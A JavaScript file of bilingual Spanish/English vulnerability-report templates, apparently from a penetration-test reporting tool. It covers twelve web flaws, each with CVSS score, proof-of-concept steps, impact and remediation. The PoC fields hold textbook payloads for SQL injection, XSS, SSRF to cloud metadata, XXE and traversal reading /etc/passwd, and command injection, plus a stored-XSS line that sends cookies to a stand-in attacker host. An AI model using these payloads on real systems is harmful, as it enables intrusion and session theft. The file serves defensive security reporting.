// Plantillas de vulnerabilidades (bilingües)

const templates = {
    sqli: {
        key: 'sqli',
        severity: "crit",
        cvss: "9.8",
        reference: "OWASP Top 10: A03:2021-Injection / CWE-89",
        es: {
            title: "Inyección SQL (SQLi)",
            description: "La aplicación no neutraliza adecuadamente los elementos especiales dentro de los comandos SQL, lo que permite a un atacante inyectar consultas SQL arbitrarias. Esto ocurre cuando la entrada del usuario se concatena dinámicamente sin parametrización.",
            poc: "1. Identificar el parámetro vulnerable.\n2. Interceptar la petición HTTP.\n3. Inyectar el payload: ' OR '1'='1 --\n4. Observar el bypass de autenticación o la extracción de datos.",
            impact: "Pérdida completa de la confidencialidad, integridad y disponibilidad de los datos. Potencial de Ejecución Remota de Código (RCE) en el servidor de base de datos.",
            remediation: "1. Utilizar consultas parametrizadas (Prepared Statements) consistentemente.\n2. Implementar un marco ORM seguro.\n3. Aplicar validación de entrada estricta (allow-listing).",
        },
        en: {
            title: "SQL Injection (SQLi)",
            description: "The application fails to properly neutralize special elements within SQL commands, allowing an attacker to inject arbitrary SQL queries. This occurs when user-supplied input is dynamically concatenated without parameterization.",
            poc: "1. Identify the vulnerable parameter.\n2. Intercept the HTTP request.\n3. Inject the payload: ' OR '1'='1 --\n4. Observe authentication bypass or unauthorized data extraction.",
            impact: "Complete loss of data confidentiality, integrity, and availability. Potential for Remote Code Execution (RCE) on the underlying database server.",
            remediation: "1. Use parameterized queries (Prepared Statements) consistently.\n2. Implement a safe Object-Relational Mapping (ORM) framework.\n3. Apply strict input validation (allow-listing).",
        }
    },
    xss_r: {
        key: 'xss_r',
        severity: "high",
        cvss: "6.1",
        reference: "OWASP Top 10: A03:2021-Injection / CWE-79",
        es: {
            title: "Cross-Site Scripting (XSS) Reflejado",
            description: "La aplicación incluye datos no confiables en una página web sin validación adecuada. Un atacante puede enviar un enlace malicioso a una víctima y el script se ejecutará en su navegador.",
            poc: "1. Construir la URL maliciosa: https://ejemplo.com/?q=<script>alert(document.domain)<\/script>\n2. Enviar a la víctima.\n3. El navegador de la víctima ejecuta el script al hacer clic.",
            impact: "Robo de cookies de sesión, secuestro de cuentas, redirección a sitios maliciosos o ejecución de acciones en nombre del usuario afectado.",
            remediation: "Implementar codificación de salida (Output Encoding) contextual antes de renderizar datos. Utilizar cabeceras de seguridad como Content-Security-Policy (CSP).",
        },
        en: {
            title: "Reflected Cross-Site Scripting (XSS)",
            description: "The application includes untrusted data in a web page without proper validation or escaping. An attacker can send a malicious link to a victim, executing JavaScript in their browser.",
            poc: "1. Construct the malicious URL: https://example.com/?q=<script>alert(document.domain)<\/script>\n2. Send the URL to the victim.\n3. When the victim clicks, their browser executes the script.",
            impact: "Theft of session cookies, account hijacking, redirection to malicious sites, or execution of unauthorized actions on behalf of the user.",
            remediation: "Implement contextual Output Encoding before rendering user-controlled data. Use security headers such as Content-Security-Policy (CSP).",
        }
    },
    xss_s: {
        key: 'xss_s',
        severity: "high",
        cvss: "7.5",
        reference: "OWASP Top 10: A03:2021-Injection / CWE-79",
        es: {
            title: "Cross-Site Scripting (XSS) Almacenado",
            description: "La aplicación almacena entrada no sanitizada en el servidor. Cuando otros usuarios solicitan los datos, el script malicioso se ejecuta de forma persistente.",
            poc: "1. Identificar un campo guardado (ej. comentarios).\n2. Inyectar: <script>fetch('http://atacante.com/log?c='+document.cookie)<\/script>\n3. Guardar. El payload se ejecutará para cualquier visitante.",
            impact: "Compromiso persistente de cuentas de usuario, robo continuo de sesiones y distribución de malware a los visitantes.",
            remediation: "Implementar validación de entrada y aplicar Output Encoding estricto al renderizar en el navegador.",
        },
        en: {
            title: "Stored Cross-Site Scripting (XSS)",
            description: "The application stores unsanitized user input on the server. When other users request the stored data, the malicious script executes persistently.",
            poc: "1. Identify an input field that is saved and displayed (e.g., comments).\n2. Inject payload: <script>fetch('http://attacker.com/log?c='+document.cookie)<\/script>\n3. Save. The payload executes for anyone visiting the page.",
            impact: "Persistent compromise of user accounts, continuous session theft, and malware distribution to application visitors.",
            remediation: "Implement input validation and apply strict Output Encoding when stored data is rendered in the browser.",
        }
    },
    idor: {
        key: 'idor',
        severity: "high",
        cvss: "7.5",
        reference: "OWASP Top 10: A01:2021-Broken Access Control / CWE-639",
        es: {
            title: "Insecure Direct Object Reference (IDOR)",
            description: "La aplicación expone referencias directas a objetos internos y no valida adecuadamente los permisos del usuario para acceder a dichos recursos.",
            poc: "1. Iniciar sesión con el Usuario A.\n2. Acceder a un recurso propio (ej. /api/facturas/1001).\n3. Cambiar el ID al recurso del Usuario B (ej. /api/facturas/1002).\n4. Confirmar que devuelve datos ajenos.",
            impact: "Acceso no autorizado a datos sensibles de otros usuarios, modificaciones horizontales de privilegios y fuga de información.",
            remediation: "Implementar controles de acceso a nivel de objeto. Verificar en el backend que el usuario actual posee permisos sobre el recurso solicitado.",
        },
        en: {
            title: "Insecure Direct Object Reference (IDOR)",
            description: "The application exposes direct references to internal objects and does not properly validate user permissions to access those objects.",
            poc: "1. Log in as User A.\n2. Access an owned resource (e.g., /api/invoices/1001).\n3. Modify the ID to a resource belonging to User B (e.g., /api/invoices/1002).\n4. Confirm it returns unauthorized data.",
            impact: "Unauthorized access to sensitive data of other users, horizontal privilege escalation, and information disclosure.",
            remediation: "Implement object-level access controls. Always verify on the backend that the current user is authorized to access the requested resource.",
        }
    },
    ssrf: {
        key: 'ssrf',
        severity: "crit",
        cvss: "8.6",
        reference: "OWASP Top 10: A10:2021-Server-Side Request Forgery",
        es: {
            title: "Server-Side Request Forgery (SSRF)",
            description: "La aplicación permite obligar al servidor a realizar solicitudes HTTP arbitrarias a servicios internos o externos.",
            poc: "1. Identificar funcionalidad de carga por URL.\n2. Apuntar a servicio interno: url=http://169.254.169.254/latest/meta-data/\n3. Observar la respuesta con credenciales internas.",
            impact: "Exposición de servicios internos, escaneo de la red perimetral, robo de credenciales en la nube o ejecución de comandos.",
            remediation: "Validar estrictamente las URLs mediante allow-list. Bloquear peticiones a direcciones IP internas o de loopback.",
        },
        en: {
            title: "Server-Side Request Forgery (SSRF)",
            description: "The application allows an attacker to force the server to make arbitrary HTTP requests to internal or external services.",
            poc: "1. Identify URL loading functionality.\n2. Send request pointing to cloud internal service: url=http://169.254.169.254/latest/meta-data/\n3. Observe the response leaking internal credentials.",
            impact: "Exposure of internal services, perimeter network scanning, cloud credential theft, or remote code execution.",
            remediation: "Strictly validate incoming URLs using an allow-list. Explicitly block requests to internal or loopback IP addresses.",
        }
    },
    csrf: {
        key: 'csrf',
        severity: "med",
        cvss: "6.5",
        reference: "CWE-352: Cross-Site Request Forgery",
        es: {
            title: "Cross-Site Request Forgery (CSRF)",
            description: "Un atacante obliga al navegador de un usuario a ejecutar acciones no deseadas en una web donde está autenticado.",
            poc: "1. Crear HTML malicioso con un formulario oculto apuntando a una acción del sitio.\n2. Configurar auto-envío (onload).\n3. Engañar a la víctima para que visite la página.",
            impact: "Ejecución de acciones no autorizadas en nombre de la víctima, como cambios de contraseñas o transferencias.",
            remediation: "Implementar tokens anti-CSRF únicos por sesión en solicitudes de cambio de estado. Usar atributo SameSite en cookies.",
        },
        en: {
            title: "Cross-Site Request Forgery (CSRF)",
            description: "An attacker forces an authenticated user's browser to execute unwanted actions on a trusted web application.",
            poc: "1. Create a malicious HTML page with a hidden form pointing to a platform action.\n2. Set the form to auto-submit (onload).\n3. Trick the authenticated victim into visiting the page.",
            impact: "Execution of unauthorized actions on behalf of the victim, such as configuration changes, passwords resets, or bank transfers.",
            remediation: "Implement unique anti-CSRF tokens per session on all state-changing requests. Use SameSite attribute for cookies.",
        }
    },
    xxe: {
        key: 'xxe',
        severity: "high",
        cvss: "7.5",
        reference: "OWASP Top 10: A05:2021-Security Misconfiguration",
        es: {
            title: "XML External Entity (XXE) Injection",
            description: "La aplicación procesa entradas XML sin desactivar la resolución de entidades externas, permitiendo la lectura de archivos o SSRF.",
            poc: "1. Interceptar solicitud que acepta XML.\n2. Inyectar: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n3. Usar &xxe; en un campo reflejado.",
            impact: "Lectura de archivos confidenciales del servidor, ataques SSRF a redes internas, o denegación de servicio.",
            remediation: "Deshabilitar completamente el procesamiento de entidades externas (XXE) y DTDs en el parser XML.",
        },
        en: {
            title: "XML External Entity (XXE) Injection",
            description: "The application processes XML input without disabling external entity resolution, allowing local file reads or SSRF.",
            poc: "1. Intercept a request accepting XML.\n2. Inject: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n3. Use the &xxe; entity within a reflected XML field.",
            impact: "Reading of confidential server files, SSRF attacks to internal networks, or Denial of Service (Billion Laughs).",
            remediation: "Completely disable the processing of external entities (XXE) and Document Type Definitions (DTDs) in the XML parser.",
        }
    },
    rce: {
        key: 'rce',
        severity: "crit",
        cvss: "10.0",
        reference: "CWE-78: OS Command Injection",
        es: {
            title: "Remote Code Execution (RCE)",
            description: "La aplicación permite la ejecución arbitraria de comandos a nivel del sistema operativo debido a una inyección de comandos.",
            poc: "1. Identificar punto de entrada que procesa comandos.\n2. Concatenar payload: 8.8.8.8 ; id\n3. Observar el resultado del comando en la respuesta.",
            impact: "Compromiso total del servidor. El atacante obtiene control completo sobre la infraestructura.",
            remediation: "Evitar llamar a comandos del sistema directamente. Utilizar APIs seguras y técnicas de sandboxing.",
        },
        en: {
            title: "Remote Code Execution (RCE)",
            description: "The application allows arbitrary execution of OS-level commands due to a command injection vulnerability.",
            poc: "1. Identify an entry point that processes system commands.\n2. Concatenate the payload: 8.8.8.8 ; id\n3. Observe the result of the injected command returned by the server.",
            impact: "Total server compromise. The attacker gains full control over the infrastructure.",
            remediation: "Avoid calling system commands directly from the application. Use secure APIs and sandboxing techniques.",
        }
    },
    lfi: {
        key: 'lfi',
        severity: "high",
        cvss: "7.5",
        reference: "CWE-22: Path Traversal",
        es: {
            title: "Local File Inclusion (LFI)",
            description: "La aplicación permite a un atacante incluir y visualizar archivos locales del servidor debido a nula validación de rutas.",
            poc: "1. Identificar parámetro vulnerable (ej. ?page=about).\n2. Inyectar saltos de directorio: ?page=../../../../../../etc/passwd\n3. Observar el contenido del archivo interno.",
            impact: "Exposición de código fuente, credenciales, archivos de configuración, y potencial escalada a RCE.",
            remediation: "No permitir a los usuarios controlar rutas de archivos. Usar un mapeo indirecto (allow-list).",
        },
        en: {
            title: "Local File Inclusion (LFI)",
            description: "The application allows an attacker to include and view local server files due to poor path validation.",
            poc: "1. Identify a vulnerable parameter (e.g., ?page=about).\n2. Inject directory traversal sequences: ?page=../../../../../../etc/passwd\n3. Observe the internal file content rendered.",
            impact: "Exposure of sensitive information, source code, configuration files, and potential escalation to RCE.",
            remediation: "Do not allow users to control file paths. Use an indirect mapping (allow-list of identifiers).",
        }
    },
    cors: {
        key: 'cors',
        severity: "med",
        cvss: "5.4",
        reference: "OWASP Top 10: A05:2021-Security Misconfiguration",
        es: {
            title: "CORS Misconfiguration",
            description: "La política CORS es excesivamente permisiva, permitiendo que orígenes arbitrarios accedan a recursos de usuarios.",
            poc: "1. Enviar petición con cabecera 'Origin: https://atacante.com'.\n2. Confirmar que el servidor responde con Access-Control-Allow-Origin reflejado y Allow-Credentials: true.",
            impact: "Robo de datos sensibles de la sesión desde dominios controlados por atacantes.",
            remediation: "Configurar CORS de forma estricta. Implementar una lista blanca (allow-list) explícita de orígenes de confianza.",
        },
        en: {
            title: "CORS Misconfiguration",
            description: "The Cross-Origin Resource Sharing (CORS) policy is overly permissive, allowing arbitrary origins to access user resources.",
            poc: "1. Send a request with 'Origin: https://attacker.com'.\n2. Confirm the server responds with Access-Control-Allow-Origin reflecting the domain and Allow-Credentials: true.",
            impact: "Theft of sensitive session data or execution of cross-origin actions from attacker-controlled domains.",
            remediation: "Configure CORS headers strictly. Implement an explicit allow-list of trusted origins.",
        }
    },
    broken_auth: {
        key: 'broken_auth',
        severity: "crit",
        cvss: "8.1",
        reference: "OWASP Top 10: A07:2021-Identification and Authentication Failures",
        es: {
            title: "Autenticación Rota (Broken Auth)",
            description: "La gestión de sesiones se implementa incorrectamente, permitiendo a los atacantes comprometer contraseñas o tokens.",
            poc: "1. Interceptar el inicio de sesión.\n2. Realizar ataques de fuerza bruta debido a la ausencia de rate limiting.\n3. Acceder exitosamente.",
            impact: "Adquisición de cuentas de usuario, robo de identidad e infiltración de sistemas.",
            remediation: "Implementar autenticación multifactor (MFA), políticas de contraseñas robustas y rate limiting.",
        },
        en: {
            title: "Broken Authentication",
            description: "Session management is implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.",
            poc: "1. Intercept the login process.\n2. Perform brute-force/credential stuffing attacks due to lack of rate limiting.\n3. Access successfully with stolen credentials.",
            impact: "Takeover of user accounts, identity theft, and system infiltration.",
            remediation: "Implement multi-factor authentication (MFA), robust password policies, and limit failed login attempts.",
        }
    },
    ssti: {
        key: 'ssti',
        severity: "crit",
        cvss: "9.8",
        reference: "CWE-1336: Improper Neutralization Used in a Template Engine",
        es: {
            title: "Server-Side Template Injection (SSTI)",
            description: "El atacante inyecta sintaxis de plantillas (templates) que se ejecuta en el servidor.",
            poc: "1. Identificar punto reflejado.\n2. Inyectar payload: {{7*7}}.\n3. Si devuelve '49', intentar RCE mediante librerías nativas del template.",
            impact: "Ejecución Remota de Código (RCE) y compromiso total del servidor.",
            remediation: "No renderizar plantillas con entrada de usuario. Usar entornos restrictivos (sandboxes).",
        },
        en: {
            title: "Server-Side Template Injection (SSTI)",
            description: "The attacker injects native template syntax that is executed on the server-side.",
            poc: "1. Identify a reflected input point.\n2. Inject template payload: {{7*7}}.\n3. If it returns '49', attempt RCE using template native libraries.",
            impact: "Remote Code Execution (RCE) and total server compromise.",
            remediation: "Do not render templates using user-provided input. If necessary, use restrictive sandboxes.",
        }
    },
    api_exposure: {
        key: 'api_exposure',
        severity: "high",
        cvss: "7.5",
        reference: "CWE-798: Use of Hard-coded Credentials",
        es: {
            title: "Exposición de Claves API",
            description: "Tokens o contraseñas se encuentran hardcoded en el frontend JavaScript o en repositorios públicos.",
            poc: "1. Inspeccionar archivos .js descargados.\n2. Buscar texto como: const AWS_KEY = 'AKIA...'.\n3. Autenticarse en el servicio externo.",
            impact: "Acceso a servicios en la nube facturables y robo de datos de la empresa.",
            remediation: "Almacenar claves sensibles únicamente en el servidor usando variables de entorno o Secret Managers.",
        },
        en: {
            title: "API Key Exposure",
            description: "Private API keys, tokens, or passwords are hardcoded in frontend JavaScript or exposed in public repositories.",
            poc: "1. Inspect downloaded .js files.\n2. Find cleartext like: const AWS_KEY = 'AKIA...'.\n3. Authenticate against the external service.",
            impact: "Unauthorized access to billable cloud services, data theft, and infrastructure compromise.",
            remediation: "Sensitive keys must be stored only on the server using environment variables or Secret Managers.",
        }
    }
};
